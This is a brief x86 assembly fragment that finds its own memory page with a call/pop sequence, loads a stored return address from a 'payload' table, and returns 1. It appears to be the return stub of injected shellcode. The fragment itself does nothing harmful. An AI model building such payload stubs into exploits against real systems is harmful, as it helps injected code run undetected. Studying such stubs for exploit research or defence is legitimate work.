%include 'defines.asm'

call back
back:   pop eax
        and eax, 0xFFFFF000
mov eax, DWORD payload_find_ret_addr[eax]
push eax
; following two lines are just shorter way to do: mov eax, 1
xor eax,eax
inc eax
ret
